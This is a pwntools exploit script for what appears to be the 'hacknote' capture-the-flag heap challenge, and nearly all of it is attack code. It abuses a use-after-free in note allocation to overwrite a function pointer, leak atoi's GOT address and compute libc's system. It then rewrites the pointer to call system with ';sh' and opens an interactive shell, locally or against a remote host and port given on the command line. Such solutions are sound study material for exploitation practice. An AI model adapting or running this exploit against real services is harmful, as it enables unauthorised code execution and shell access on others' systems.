from pwn import *

atoi_got = 0x804a034
atoi_off = 0x318e0
puts     = 0x804862b
sys_off  = 0x40310

def alloc(size, data):

	r.sendlineafter('choice :', '1')
	r.sendlineafter('size :', str(size))

	if size == 8:
		r.send(data)
	else:
		r.sendlineafter('Content :', data)

	return

def dump(idx): 

	r.sendlineafter('choice :', '3')
	r.sendlineafter('Index :', str(idx))

	return 

def free(idx):

	r.sendlineafter('choice :', '2')
	r.sendlineafter('Index :', str(idx))

	return

def pwn():

	alloc(0x20, 'A'*10)
	alloc(0x20, 'B'*10)

	free(0)
	free(1)

	payload = flat(puts, atoi_got)

	alloc(8, payload)

	dump(0)

	leak   = u32(r.recv(4))
	libc   = leak - atoi_off
	system = libc + sys_off

	log.info("Leak:   0x{:x}".format(leak))
	log.info("Libc:   0x{:x}".format(libc))
	log.info("system: 0x{:x}".format(system))

	free(1)
	
	### Arena state right before the next allocation
	#
	#
	#     0x804b000 is the note 0's original chunk, which will become 
	#     the content chunk for the new allocated note
	#     we can overwrite the function pointer with system's address
	#     and what's supposed to be the argument for the function pointer
	#     with /bin/sh
	#
	#
	#     ==================  Main Arena  ==================
	#     (0x10)     fastbin[0]: 0x804b038 --> 0x804b000 --> 0x0
	#     (0x18)     fastbin[1]: 0x0
	#     (0x20)     fastbin[2]: 0x0
	#     (0x28)     fastbin[3]: 0x804b048 --> 0x804b010 --> 0x0
	#     (0x30)     fastbin[4]: 0x0
	#     (0x38)     fastbin[5]: 0x0
	#     (0x40)     fastbin[6]: 0x0
	
	payload = flat(system, ';sh\x00')
	alloc(8, payload)

	dump(0)

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./hacknote')
        pause()
        pwn()
